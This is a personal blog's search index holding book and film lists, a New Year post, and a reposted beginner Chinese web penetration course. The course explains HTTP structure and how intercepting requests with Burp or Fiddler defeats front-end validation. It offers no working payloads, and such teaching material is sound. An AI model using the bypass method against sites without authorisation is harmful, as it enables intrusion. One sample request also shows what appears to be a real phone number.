<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[My Book List In 2018]]></title>
      <url>/2018/01/01/2018books/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>The books i have read in 2018.<a id="more"></a></excerpt></p>
<the rest="" of="" contents="" |="" 余下全文="">



<h2 id="Professional"><a href="#Professional" class="headerlink" title="Professional"></a>Professional</h2><h3 id="《白帽子讲安全》"><a href="#《白帽子讲安全》" class="headerlink" title="《白帽子讲安全》"></a>《白帽子讲安全》</h3><h3 id="《代码审计-企业级web代码安全架构》"><a href="#《代码审计-企业级web代码安全架构》" class="headerlink" title="《代码审计:企业级web代码安全架构》"></a>《代码审计:企业级web代码安全架构》</h3><h3 id="《黑客攻防技术宝典：Web实战篇-第2版-》"><a href="#《黑客攻防技术宝典：Web实战篇-第2版-》" class="headerlink" title="《黑客攻防技术宝典：Web实战篇(第2版)》"></a>《黑客攻防技术宝典：Web实战篇(第2版)》</h3><h3 id="《鸟哥的Linux私房菜-基础学习篇-第三版-》"><a href="#《鸟哥的Linux私房菜-基础学习篇-第三版-》" class="headerlink" title="《鸟哥的Linux私房菜 基础学习篇(第三版)》"></a>《鸟哥的Linux私房菜 基础学习篇(第三版)》</h3><h2 id="Interesting"><a href="#Interesting" class="headerlink" title="Interesting"></a>Interesting</h2><h3 id="《一句顶一万句》"><a href="#《一句顶一万句》" class="headerlink" title="《一句顶一万句》"></a><a href="https://book.douban.com/subject/3633461/" target="_blank" rel="noopener">《一句顶一万句》</a></h3><h3 id="《一个人的朝圣》"><a href="#《一个人的朝圣》" class="headerlink" title="《一个人的朝圣》"></a><a href="https://book.douban.com/subject/24934182/" target="_blank" rel="noopener">《一个人的朝圣》</a></h3></the>]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Perception </tag>
            
            <tag> Book </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[My Film List In 2018]]></title>
      <url>/2018/01/01/2018films/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>The films i have watched in 2018.<a id="more"></a></excerpt></p>
<the rest="" of="" contents="" |="" 余下全文=""></the>]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Film </tag>
            
            <tag> Perception </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[See you 2017 , Hello 2018]]></title>
      <url>/2018/01/01/bye2017/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br><em>What we have once enjoyed we can never lose . All that we love becomes part of us .</em>  ——Helen Keller<a id="more"></a></excerpt></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p><br></p>
<p>To 2017：You let me cry,smile and laugh,but you let me be ambitious for my future at last.</p>
<p>To 2018：Be down-to-earth -&gt; Fulfill my flags step by step  <strong>:)</strong></p>
<p>Only for encountering a better-me～<img src="https://ws4.sinaimg.cn/large/006tKfTcly1fmz7ypepakj309q01ywem.jpg" width="20%"></p>
<hr>

<center><strong><em>《TIME ZONE》</em></strong></center>

<p><br></p>
<center><em>New York is 3 hours ahead of California,</em></center>

<center><em>but it does not make California slow.</em></center>

<center><em>Someone graduated at the age of 22,</em></center>

<center><em>but waited 5 years before securing a good job！</em></center><br><br><center><em>Someone became a CEO at 25,</em></center>

<center><em>and died at 50.</em></center>

<center><em>While another became a CEO at 50,</em></center>

<center><em>and lived to 90 years.</em></center>

<center><br><center><em>Someone is still single,</em></center>

<center><em>while someone else got married.</em></center>

<center><em>Obama retires at 55,</em></center>

<center><em>but Trump starts at 70.</em></center>

<center><br><center><em>Absolutely everyone in this world works based on their Time Zone.</em></center>

<center><em>People around you might seem to go ahead of you,</em></center>

<center><em>some might seem to be behind you.</em></center>

<center><em>But everyone is running their own RACE, in their own TIME</em></center>.<br><br><center><em>Don’t envy them or mock them.</em></center>

<center><em>They are in their TIME ZONE,and you are in yours！</em></center>

<center><br><center><em>Life is about waiting for the right moment to act.</em></center>

<center><em>So, RELAX.</em></center>

<center><em>You’re not LATE.</em></center>

<center><em>You’re not EARLY.</em></center>

<center><em>You are very much ON TIME,and in your TIME ZONE Destiny set up for you.</em></center>

<p> <br></p>
<p>  <br></p>
<center><strong>·End ·</strong></center></center></center></center></the>]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 心路历程 </tag>
            
            <tag> Expectation </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2017-films]]></title>
      <url>/2017/12/30/2017films/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>之前有些看的都已经忘记了～趁元旦有些许空档，就补了几部电影～<a id="more"></a></excerpt></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p><br></p>
<h2 id="《-A-Ghost-Story》（《鬼魅浮生》）"><a href="#《-A-Ghost-Story》（《鬼魅浮生》）" class="headerlink" title="《 A Ghost Story》（《鬼魅浮生》）"></a>《 A Ghost Story》（《鬼魅浮生》）</h2><p>原本以为是一部鬼片～结果看完之后，发现是一部文艺意识流的“鬼片”</p>
<p>最印象深刻的就是女主，吃派吃到吐的画面～</p>
<p>看完第一遍，的确是一脸茫然，但是细思过后，仿佛又好像明白了些什么：</p>
<p>整部片子，基调有点悲观，以床单鬼为线索，镜头很长，但过渡很自然。亮点就是能用肢体语言表达的都不会用台词，能用镜头表达的也不用台词，全是用镜头语言～～所以才会“细思极恐”</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fmyp5bfnt2j30fe0bkgmb.jpg" alt=""></p>
</the>]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Film </tag>
            
            <tag> Perception </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[渗透课程]]></title>
      <url>/2017/12/26/%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>无意中发现的 treasure <strong>:) </strong>，虽然里面很多东西我都不会，但是广泛涉猎，mark下来，没事看一看，复现一下，何尝又不是一件好事情？<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p><br></p>
<p><strong>本文所有文章均转载自：<a href="http://www.yuntest.org/" target="_blank" rel="noopener">http://www.yuntest.org/</a> 如有侵权，请联系。</strong></p>
<hr>
<p><br></p>
<h1 id="前言-揭开Web渗透与安全的面纱（必看）"><a href="#前言-揭开Web渗透与安全的面纱（必看）" class="headerlink" title="前言-揭开Web渗透与安全的面纱（必看）"></a>前言-揭开Web渗透与安全的面纱（必看）</h1><h2 id="服务器是怎么被入侵的"><a href="#服务器是怎么被入侵的" class="headerlink" title="服务器是怎么被入侵的"></a>服务器是怎么被入侵的</h2><p>攻击者想要对一台计算机<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>必须具备以下条件：</p>
<p>1、服务器与客户端能够正常通讯</p>
<p>（服务器是为客户端提供服务的）</p>
<p>2、服务器向客户端提供的权限（服务）或者说是端口。</p>
<h2 id="服务端所提供的服务"><a href="#服务端所提供的服务" class="headerlink" title="服务端所提供的服务"></a>服务端所提供的服务</h2><p>早期的黑客入侵的方法大部分都是对服务器进行端口扫描，对数据库的爆破，以及对FTP的爆破（穷举）缓冲区溢出攻击的方式。尽管如此没有含量的<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>，在当时的100台计算机中，大约有20台计算机能中招。可见当初的web服务器很脆弱。</p>
<p>我为什么说这些呢，好，接着看。如今的web不仅仅是web，它还有个名字叫做 web应用程序 。为什么叫做web应用程序，因为web已经不是以前的web，它可以社交、购物、办公、游戏、公司管理、学校管理等等等等！从某种方面上来讲，它比客户端程序更方便，更出色，更完善。</p>
<hr>
<h2 id="了解web的基础知识"><a href="#了解web的基础知识" class="headerlink" title="了解web的基础知识"></a>了解web的基础知识</h2><p>我们可以把html,asp,php等网页看做是一种程序（脚本语言），而他需要放在服务器的web容器（比如iis,Apache等）里才能编译成可视化内容。所以我们用户访问的网站都是经过容器编译过的。Web容器是基于系统的，它可以对计算机系统发出命令。Web容器又是处理网站脚本文件的，也就是说：我们是通过对脚本程序发出命令，再由Web容器处理，间接操纵服务器</p>
<h2 id="怎么攻陷服务器"><a href="#怎么攻陷服务器" class="headerlink" title="怎么攻陷服务器"></a>怎么攻陷服务器</h2><p>这张图是我在某群里下载的，个人感觉概括性很强，就用到这里来了。大家看的懂得就看得懂，看不懂的也没关系。但是以下内容必须看得懂：</p>
<p>想入侵一台服务器，大致分为3个入口：</p>
<p>1,C段攻击</p>
<p>2,services</p>
<p>3,社会工程学</p>
<p>C段攻击指的是攻击者通过渗透同一个网段内的一台主机对目标主机进行ARP等手段渗透</p>
<p>社会工程学：高端攻击必须掌握的一个技能,是属于脚本以外的社交欺骗技术,涉及到物理渗透, 总之就是—骗 。（后面详说）</p>
<p>至于services：又有很多入口（溢出、MySQL、FTP、mssql、rdp、web等等）,这里的Web指的是网站脚本程序,也存在入口（注入,上传漏洞,xss,包含漏洞,代码执行,逻辑漏洞等等等等）</p>
<p>差不多我要讲课的大半部分内容都围绕着以上的知识点。特别是services</p>
<h1 id="第一篇-Web渗透需要接触的语言"><a href="#第一篇-Web渗透需要接触的语言" class="headerlink" title="第一篇-Web渗透需要接触的语言"></a>第一篇-Web渗透需要接触的语言</h1><p>—恢复内容开始—</p>
<p>上一篇我们讲过了,Web<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>的基本原理,在原理中我们也提到了Web应用程序（脚本语言）,本章就谈到了Web<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>要涉及的语言。</p>
<h2 id="涉及语言："><a href="#涉及语言：" class="headerlink" title="涉及语言："></a>涉及语言：</h2><p>1、html:是前段语言的其中一个,也是最常见的,涉及审查元素的修改以及自行构造界面（如构造上传点）</p>
<p>2、JavaScript:也是属于前段语言之一（掌握这个语言可以更了解<a href="http://www.yuntest.org/archives/tag/xss/" target="_blank" rel="noopener">xss</a>跨站脚本攻击）</p>
<p>3、数据库:这里的数据库不止是一种语言,而是包含了多种数据库（如我们常见MySQL,ms<a href="http://www.yuntest.org/archives/tag/sql/" target="_blank" rel="noopener">sql</a>,db2）,而我们要掌握的就是操控数据库的SQL语句,在<a href="http://www.yuntest.org/archives/tag/zhu-ru/" target="_blank" rel="noopener">注入</a>的时候多用到。</p>
<p>4、JAVA:跨平台语言,无论在哪个系统,只需要一个环境,web领域中有很多涉及。有很多大型企业都是用JAVA开发Web。还有我们的渗透神器burp 等等都是由JAVA开发。</p>
<p>5、PHP,跨平台语言,即写即用,无需编译。当代主流Web程序。</p>
<p>6、C/C++:公认的永远不会衰败的语言,怎么说呢,这个必须学,学了只有好处没有坏处。Windows操作系统一大部分都是由C完成的。</p>
<h2 id="小编说"><a href="#小编说" class="headerlink" title="小编说"></a>小编说</h2><p>看到这里许多朋友可能会问,学个渗透还得需要学那么多基础。肯定有一些人要放弃了。其实小编也是九牛一毛,就学了一些平常会用到的,很多时候还得看前辈的文章。不过多多少少还是有点经验的,下面就分享小编偷工减料的技巧,其实我们可以学三个最经常用到的,也是最简单的（html,JavaScript,SQL）还有就是抽空出来学习c语言</p>
<h2 id="学习心得"><a href="#学习心得" class="headerlink" title="学习心得"></a>学习心得</h2><p>1、html:html的语法实在是很简单,只需要学清楚头标记、尾标记（闭合）,空标记。以及一些调用,参数设置,简单标签。百度搜索html教程就有一大堆免费教程</p>
<p>2、js可以从这里学<a href="http://www.w3school.com.cn/js/index.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/js/index.asp</a>   w3school系列的挺不错</p>
<p>3、SQL:其实小编认为这个稍微了解一下就好了,毕竟现在的工具越来越成熟,在<a href="http://www.yuntest.org/archives/tag/zhu-ru/" target="_blank" rel="noopener">注入</a>方面都是以工具为主</p>
<p>4、C语言：如果你看过了html,那你学这个会有一定的思路引导。小编之前是在:慕课网学的(百度搜索）,简单通俗易懂。</p>
<p>5、还有一些常用的DOS命令也是必须要学的,例如net user啊什么的</p>
<p>6、JAVA可以不用太深入学习,但是！必须了解它的框架构造以及环境的搭建（后面用的地方多着呢）</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果不是学代码审计工作,而是本着Web的目标去学习,那么用小编所说的偷懒学习法去学习还是挺合适的。但是能学还是要尽量学的,一个百度就解决了。许多小白和大神的差距就在代码上。可能会有人说：我不会英语该怎么学。</p>
<p>其实这东西跟英语关系不是很大,只要你用心一个一个学,一门通门门通。只要认真和耐心。</p>
<p>如果朋友你对脚本语言之前不是很了解,那么也没关系,接着往下看,只是要多做笔记,看一篇就如百度了解一篇涉及的内容。如果看到一半卡住了,可以随时回来学脚本。</p>
<p>—恢复内容结束—</p>
<h1 id="第二篇上-http请求协议的简单描述"><a href="#第二篇上-http请求协议的简单描述" class="headerlink" title="第二篇上-http请求协议的简单描述"></a>第二篇上-http请求协议的简单描述</h1><h2 id="HTTP协议剖析"><a href="#HTTP协议剖析" class="headerlink" title="HTTP协议剖析"></a>HTTP协议剖析</h2><p>什么是HTTP协议？如何发起请求？我认为这样讲大家能够理解：</p>
<p>浏览器访问网站也是http请求的一个过程。当你打开浏览器,访问一个URL</p>
<p>（协议://服务器IP:端口/路径/文件）的时候,相当于向服务器发送了一个http请求,然后服务器会根据你的请求,向你响应一个HTML数据。这个客户端与服务端交互的过程叫做http协议。那么这个协议的过程是什么样子的呢？（简版）</p>
<p>1：客户端向服务端发送请求</p>
<p>2：服务端向客户端响应html数据</p>
<p>3：连接自动切断</p>
<p>PS:这个请求只能由客户端发起,而服务端不能主动向客户端发起！</p>
<p>然而我们通过浏览器发送的http请求,在服务器响应后,客户端接受到的数据都是被浏览器渲染过而显示的画面。为了能更清晰的剖析客户端与服务端之间的协议交互,我们来一次脱离浏览器的http请求。这就要借用到我们的工具:</p>
<p>curl.exe</p>
<p>一般来说Linux自带curl.exe 似乎Windows没有自带curl.exe 没关系,Windows的用户也可以通过下载使用。</p>
<h2 id="脱离浏览器发起http请求"><a href="#脱离浏览器发起http请求" class="headerlink" title="脱离浏览器发起http请求"></a>脱离浏览器发起http请求</h2><p>我们可以通过输入命令:</p>
<p>cURL <a href="http://www.baidu.com/" target="_blank" rel="noopener">http://www.baidu.com/</a></p>
<p>来向百度发起http请求,看看返回的响应结果吧！</p>
<p>看,返回的是一个html文件数据！我们还可以在原命令的基础上后面加个参数 -I 来查看http服务器返回的响应头。</p>
<p>好了我们基本了解了http请求的基本逻辑,就通过下面这篇文章来对http进行深度剖析吧！</p>
<h1 id="第二篇下-HTTP协议的请求与响应深度剖析"><a href="#第二篇下-HTTP协议的请求与响应深度剖析" class="headerlink" title="第二篇下-HTTP协议的请求与响应深度剖析"></a>第二篇下-HTTP协议的请求与响应深度剖析</h1><h2 id="什么是请求方法？什么是请求头？"><a href="#什么是请求方法？什么是请求头？" class="headerlink" title="什么是请求方法？什么是请求头？"></a>什么是请求方法？什么是请求头？</h2><h3 id="HTTP请求信息由3部分组成："><a href="#HTTP请求信息由3部分组成：" class="headerlink" title="HTTP请求信息由3部分组成："></a>HTTP请求信息由3部分组成：</h3><p>1、请求方法（GET/POST） URI 协议/版本</p>
<p>2、请求头(Request Header)</p>
<p>3、请求正文</p>
<h3 id="下面我们来分析一个http请求："><a href="#下面我们来分析一个http请求：" class="headerlink" title="下面我们来分析一个http请求："></a>下面我们来分析一个http请求：</h3><p>POST <a href="http://xg.mediportal.com.cn/health/sms/verify/telephone" target="_blank" rel="noopener">http://xg.mediportal.com.cn/health/sms/verify/telephone</a> HTTP/1.1</p>
<p>User-Agent: DGroupPatient/1.052701.230/Dalvik/2.1.0 (Linux; U; Android 5.1.1; KIW-AL10 Build/HONORKIW-AL10)</p>
<p>Content-Type: application/x-www-form-urlencoded; charset=UTF-8</p>
<p>Host: xg.mediportal.com.cn</p>
<p>Connection: Keep-Alive</p>
<p>Accept-Encoding: gzip</p>
<p>Content-Length: 33</p>
<p>telephone=15527177736&amp;userType=1&amp;</p>
<h4 id="我们来对这段请求进行分析："><a href="#我们来对这段请求进行分析：" class="headerlink" title="我们来对这段请求进行分析："></a>我们来对这段请求进行分析：</h4><p>请求的第一行是—-方法（POST） URL 协议（HTTP）/版本（1.1）</p>
<p>这里的POST就是方法 HTTP请求可以使用多种请求方法。</p>
<h3 id="（1）HTTP1-1目前支持以下7种请求方法："><a href="#（1）HTTP1-1目前支持以下7种请求方法：" class="headerlink" title="（1）HTTP1.1目前支持以下7种请求方法："></a>（1）HTTP1.1目前支持以下7种请求方法：</h3><ul>
<li>GET ：请求获取由Request-URI所标识的资源</li>
<li>POST：在Request-URI所标识的资源后附加新的数据</li>
<li>HEAD：请求获取由Request-URI所标识的资源的响应消息报头</li>
<li>OPTIONS：请求查询服务器的性能，或查询与资源相关的选项和需求</li>
<li>PUT：请求服务器存储一个资源，并用Request-URI作为其标识</li>
<li>DELETE：请求服务器删除由Request-URI所标识的资源</li>
<li>TRACE：请求服务器回送收到的请求信息，主要用语测试或诊断，在Internet应用中，最常用的方法是GET和POST。最后，协议版本声明了通信过程中使用HTTP的版本。</li>
</ul>
<h3 id="（2）请求头-Request-Header"><a href="#（2）请求头-Request-Header" class="headerlink" title="（2）请求头(Request Header)"></a>（2）请求头(Request Header)</h3><p>请求头包含许多有关的客户端环境和请求正文的有用信息。例如：请求头可以声明浏览器所用的语言，请求正文的长度等。</p>
<ul>
<li>User-Agent: DGroupPatient/1.052701.230/Dalvik/2.1.0 (Linux; U; Android 5.1.1; KIW-AL10 Build/HONORKIW-AL10) //用户发送请求的客户端环境</li>
<li>Content-Type: application/x-www-form-urlencoded; charset=UTF-8 //表单默认的提交数据的格式</li>
<li>Host: xg.mediportal.com.cn //请求资源的Intenet主机和端口号</li>
<li>Connection: Keep-Alive //持久连接</li>
<li>Accept-Encoding: gzip //浏览器能够进行解码的数据编码方式</li>
<li>Content-Length: 33 //请求正文的长度</li>
<li>Content-Type</li>
</ul>
<p><strong>是返回消息中非常重要的内容，表示后面的文档属于什么MIME类型。</strong></p>
<p>Content-Type: [type]/[subtype]; parameter。例如最常见的就是text/html，它的意思是说返回的内容是文本类型，这个文本又是HTML格式的。原则上浏览器会根据Content-Type来决定如何显示返回的消息体内容：</p>
<ul>
<li>Host指定请求资源的Intenet主机和端口号，必须表示请求url的原始服务器或网关的位置。HTTP/1.1请求必须包含主机头域，否则系统会以400状态码返回</li>
<li>Accept：浏览器可接受的MIME类型</li>
<li>Accept-Charset：浏览器可接受的字符集</li>
<li>Accept-Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间</li>
<li>Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到</li>
<li>Authorization：授权信息，通常出现在对服务器发送的WWW-Authenticate头的应答中</li>
<li>Connection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep- Alive”，或者看到请求使用的是HTTP1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入 ByteArrayOutputStream，然后在正式写出内容之前计算它的大小</li>
<li>Content-Length：表示请求消息正文的长度</li>
<li>Cookie：这是最重要的请求头信息之一</li>
<li>From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它</li>
<li>Host：初始URL中的主机和端口</li>
<li>If-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答</li>
<li>Pragma：指定“no-cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝</li>
<li>Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面</li>
<li>User-Agent：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用</li>
<li>UA-Pixels，UA-Color，UA-OS，UA-CPU ： 由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型</li>
</ul>
<h4 id="常见的MIME类型如下："><a href="#常见的MIME类型如下：" class="headerlink" title="常见的MIME类型如下："></a>常见的MIME类型如下：</h4><p>text/html ： HTML格式</p>
<p>text/plain ：纯文本格式</p>
<p>text/xml ： XML格式</p>
<p>image/gif ：gif图片格式</p>
<p>image/jpeg ：jpg图片格式</p>
<p>image/png：png图片格式</p>
<p>以application开头的媒体格式类型：</p>
<p>application/xhtml+xml ：XHTML格式</p>
<p>application/xml ： XML数据格式</p>
<p>application/atom+xml ：Atom XML聚合格式</p>
<p>application/json ： JSON数据格式</p>
<p>application/pdf ：pdf格式</p>
<p>application/msword ： Word文档格式</p>
<p>application/octet-stream ： 二进制流数据（如常见的文件下载）</p>
<p>application/x-www-form-urlencoded ： <form enctype="””">中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）</form></p>
<p>另外一种常见的媒体格式是上传文件之时使用的：</p>
<p>multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式</p>
<h3 id="（3）请求正文"><a href="#（3）请求正文" class="headerlink" title="（3）请求正文"></a>（3）请求正文</h3><p>请求头和请求正文之间是一个空行，这个行非常重要，它表示请求头已经结束，接下来的是请求正文。请求正文中可以包含客户提交的查询字符串信息：</p>
<p>telephone=15527177736&amp;userType=1&amp;</p>
<h3 id="HTTP响应格式"><a href="#HTTP响应格式" class="headerlink" title="HTTP响应格式"></a>HTTP响应格式</h3><p><strong>HTTP应答与HTTP请求相似，HTTP响应也由3个部分构成，分别是：</strong></p>
<p>1、状态行</p>
<p>2、响应头(Response Header)</p>
<p>3、响应正文</p>
<p><strong>以下就是一个响应格式，我们来分析：</strong></p>
<p>HTTP/1.1 200 OK //状态行</p>
<p>Server: nginx</p>
<p>Date: Tue, 31 May 2016 02:09:24 GMT</p>
<p>Content-Type: application/json;charset=UTF-8</p>
<p>Connection: keep-alive</p>
<p>Vary: Accept-Encoding</p>
<p>Access-Control-Allow-Origin: *</p>
<p>Access-Control-Allow-Headers: X-Requested-With,access_token,access-token,content-type,multipart/form-data,application/x-www-form-urlencoded</p>
<p>Access-Control-Allow-Methods: GET,POST,OPTIONS</p>
<p>Content-Length: 49</p>
<p>{“resultCode”:1,”resultMsg”:”手机号未注册”} //正文</p>
<h4 id="（1）状态行"><a href="#（1）状态行" class="headerlink" title="（1）状态行"></a>（1）状态行</h4><p>由协议版本、数字形式的状态代码、及相应的状态描述，各元素之间以空格分隔。</p>
<p>状态代码：状态代码由3位数字组成，表示请求是否被理解或被满足。</p>
<p>状态描述：状态描述给出了关于状态代码的简短的文字描述。</p>
<p>状态代码的第一个数字定义了响应的类别，后面两位没有具体的分类。</p>
<p><strong>第一个数字有五种可能的取值：</strong></p>
<p>- 1xx: 指示信息—表示请求已接收，继续处理。</p>
<p>- 2xx: 成功—表示请求已经被成功接收、理解、接受。</p>
<p>- 3xx: 重定向—要完成请求必须进行更进一步的操作。</p>
<p>- 4xx: 客户端错误—请求有语法错误或请求无法实现。</p>
<p>- 5xx: 服务器端错误—服务器未能实现合法的请求。</p>
<p>常见的状态码：</p>
<ul>
<li>200 OK 客户端请求成功</li>
<li>400 Bad Request 由于客户端请求有语法错误，不能被服务器所理解。</li>
<li>401 Unauthonzed 请求未经授权。这个状态代码必须和WWW-Authenticate报头域一起使用</li>
<li>403 Forbidden 服务器收到请求，但是拒绝提供服务。服务器通常会在响应正文中给出不提供服务的原因</li>
<li>404 Not Found 请求的资源不存在，例如，输入了错误的URL。</li>
<li>500 Internal Server Error 服务器发生不可预期的错误，导致无法完成客户端的请求。</li>
<li>503 Service Unavailable 服务器当前不能够处理客户端的请求，在一段时间之后，服务器可能会恢复正常</li>
</ul>
<h4 id="（2）响应头"><a href="#（2）响应头" class="headerlink" title="（2）响应头"></a>（2）响应头</h4><p>响应头可能包括：</p>
<ul>
<li>Location：Location响应报头域用于重定向接受者到一个新的位置。例如：客户端所请求的页面已不存在原先的位置，为了让客户端重定向到这个页面新的位置，服务 器端可以发回Location响应报头后使用重定向语句，让客户端去访问新的域名所对应的服务器上的资源。当我们在JSP中使用重定向语句的时候，服务器 端向客户端发回的响应报头中，就会有Location响应报头域。</li>
<li>Server：Server响应报头域包含了服务器用来处理请求的软件信息。它和User-Agent请求报头域是相对应的，前者发送服务器端软件的信息，后者发送客户 端软件(浏览器)和操作系统的信息。下面是Server响应报头域的一个例子：Server: Apache-Coyote/1.1</li>
<li>WWW-Authenticate：WWW-Authenticate响应报头域必须被包含在401(未授权的)响应消息中，这个报头域和前面讲到的Authorization请求报头域是 相关的，当客户端收到401响应消息，就要决定是否请求服务器对其进行验证。如果要求服务器对其进行验证，就可以发送一个包含了 Authorization报头域的请求，下面是WWW-Authenticate响应报头域的一个例子：WWW-Authenticate: Basic realm=”Basic Auth Test!”</li>
<li>从这个响应报头域，可以知道服务器端对我们所请求的资源采用的是基本验证机制。</li>
<li>Content-Encoding：Content-Encoding实体报头域被使用作媒体类型的修饰符，它的值指示了已经被应用到实体正文的附加内容编码，因而要获得Content- Type报头域中所引用的媒体类型，必须采用相应的解码机制。Content-Encoding主要用语记录文档的压缩方法，下面是它的一个例子： Content-Encoding: gzip。如果一个实体正文采用了编码方式存储，在使用之前就必须进行解码。</li>
<li>Content-Language：Content-Language实体报头域描述了资源所用的自然语言。Content-Language允许用户遵照自身的首选语言来识别和区分实体。 如果这个实体内容仅仅打算提供给丹麦的阅读者，那么可以按照如下的方式设置这个实体报头域：Content-Language: da。</li>
<li>如果没有指定Content-Language报头域，那么实体内容将提供给所以语言的阅读者。</li>
<li>Content-Length：Content-Length实体报头域用于指明正文的长度，以字节方式存储的十进制数字来表示，也就是一个数字字符占一个字节，用其对应的ASCII码存储传输。</li>
<li>要注意的是：这个长度仅仅是表示实体正文的长度，没有包括实体报头的长度。</li>
<li>Content-Type :Content-Type实体报头域用语指明发送给接收者的实体正文的媒体类型。例如：</li>
<li>Content-Type: text/html;charset=ISO-8859-1</li>
<li>Content-Type: text/html;charset=GB2312</li>
<li>Last-Modified :Last-Modified实体报头域用于指示资源最后的修改日期及时间。</li>
<li>Expires :Expires实体报头域给出响应过期的日期和时间。通常，代理服务器或浏览器会缓存一些页面。当用户再次访问这些页面时，直接从缓存中加载并显示给用 户，这样缩短了响应的时间，减少服务器的负载。为了让代理服务器或浏览器在一段时间后更新页面，我们可以使用Expires实体报头域指定页面过期的时 间。当用户又一次访问页面时，如果Expires报头域给出的日期和时间比Date普通报头域给出的日期和时间要早(或相同)，那么代理服务器或浏览器就 不会再使用缓存的页面而是从服务器上请求更新的页面。不过要注意，即使页面过期了，也并不意味着服务器上的原始资源在此时间之前或之后发生了改变。</li>
<li>Expires实体报头域使用的日期和时间必须是RFC 1123中的日期格式，例如：</li>
<li>Expires: Thu, 15 Sep 2005 16:00:00 GMTHTTP1.1的客户端和缓存必须将其他非法的日期格式(也包括0)看作已过期。例如，为了让浏览器不要缓存页面，我们也可以利用Expires实体报头 域，设置它的值为0，如下(JSP)：response.setDateHeader(“Expires”,0);</li>
</ul>
<h1 id="第三篇-体验http协议的应用"><a href="#第三篇-体验http协议的应用" class="headerlink" title="第三篇-体验http协议的应用"></a>第三篇-体验http协议的应用</h1><p>之前我们都了解了,访问网页时,客户端与服务端之间的请求与响应数据交互。本篇就浅谈它的应用。</p>
<h2 id="利用HTTP拦截突破前段验证"><a href="#利用HTTP拦截突破前段验证" class="headerlink" title="利用HTTP拦截突破前段验证"></a>利用HTTP拦截突破前段验证</h2><p>比方说,我们在某个网页提交某些数据（例如留言、<a href="http://www.yuntest.org/archives/tag/shang-chuan/" target="_blank" rel="noopener">上传</a>、插入xss等）,发生错误（例如提示不支持该文件、您提交的内容非法）</p>
<p>如果提交之后,在原网页发生以上错误,而不是网页跳转之后发出提示。那么很可能网站验证方式是前端验证。</p>
<h3 id="什么是前端验证？"><a href="#什么是前端验证？" class="headerlink" title="什么是前端验证？"></a>什么是前端验证？</h3><p>就是在客户端发送请求,服务器响应后向客户端传输网页（html）和验证脚本（JavaScript）,我们提交内容时候都要经过网站js的验证。</p>
<p>（简单介绍）</p>
<p>而这里的这个js验证就是属于前端验证,也就是客户端验证,它只在客户端作用。</p>
<h3 id="如何突破验证"><a href="#如何突破验证" class="headerlink" title="如何突破验证"></a>如何突破验证</h3><p>这里就要用到工具了</p>
<p>推荐工具:burp、fiddler</p>
<p>这些工具有什么用呢,在这里他们的作用就是能拦截和修改http请求,也就是所谓的<a href="http://www.yuntest.org/archives/tag/zhua-bao/" target="_blank" rel="noopener">抓包</a>。</p>
<p>工具拦截突破过程原理：</p>
<p>1,开启http拦截</p>
<p>2,在网页内提交js判断规则内允许提交的内容</p>
<p>3,此时提交的请求已经被工具拦截了,网页属于堵塞状态,而且我们提交的内容已经被js判断为允许了。</p>
<p>4,在工具内修改拦截的内容（请求内容）</p>
<p>5,发送数据包（接触拦截.正常流通）</p>
<h3 id="如何绕过验证"><a href="#如何绕过验证" class="headerlink" title="如何绕过验证"></a>如何绕过验证</h3><p>同理,在接受响应时拦截包。并删除js验证用的代码</p>
